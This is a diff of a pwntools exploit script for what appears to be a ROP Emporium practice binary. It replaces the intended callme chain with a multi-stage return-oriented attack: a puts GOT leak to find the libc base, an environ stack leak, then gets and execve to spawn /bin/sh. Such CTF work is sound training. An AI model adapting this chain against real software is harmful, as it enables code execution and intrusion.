@@ -54,14 +54,36 @@ io = start()
 
 pause()
 
+io.clean()
 io.sendline(cyclic(40) +
-            flat(POP_RDI_RSI_RDX) + flat(DEADBEEF) + flat(CAFEBABE) + flat(DOODFOOD) +
-            flat(exe.symbols['callme_one']) +
-            flat(POP_RDI_RSI_RDX) + flat(DEADBEEF) + flat(CAFEBABE) + flat(DOODFOOD) +
-            flat(exe.symbols['callme_two']) +
-            flat(POP_RDI_RSI_RDX) + flat(DEADBEEF) + flat(CAFEBABE) + flat(DOODFOOD) +
-            flat(exe.symbols['callme_three'])
+            flat(POP_RDI_RSI_RDX) + flat(exe.got['puts']) + flat(CAFEBABE) + flat(DOODFOOD) +
+            flat(exe.symbols['puts']) +
+            flat(exe.symbols['pwnme'])
     )
+io.readline() # garbage
+puts_libc = u64(io.readline().strip().ljust(8, b'\0'))
+libc_base = puts_libc - exe.libc.symbols['puts']
+log.info(f"leaked puts = {hex(puts_libc)}")
+log.info(f"libc base = {hex(libc_base)}")
 
+io.clean()
+io.sendline(cyclic(40) +
+            flat(POP_RDI_RSI_RDX) + flat(libc_base + exe.libc.symbols['environ']) + flat(0) + flat(0) +
+            flat(exe.symbols['puts']) +
+            flat(exe.symbols['pwnme'])
+            )
+io.readline()
+stack_leak = u64(io.readline().strip().ljust(8, b'\0'))
+stack_pivot = stack_leak + 0x1000
+log.info(f"stack leak = {hex(stack_leak)}")
+
+io.clean()
+io.sendline(cyclic(40) +
+            flat(POP_RDI_RSI_RDX) + flat(stack_pivot) + flat(0) + flat(0) +
+            flat(libc_base + exe.libc.symbols['gets']) +
+            flat(POP_RDI_RSI_RDX) + flat(stack_pivot) + flat(0) + flat(0) +
+            flat(libc_base + exe.libc.symbols['execve'])
+            )
+io.sendline(b'/bin/sh')
 io.interactive()
 
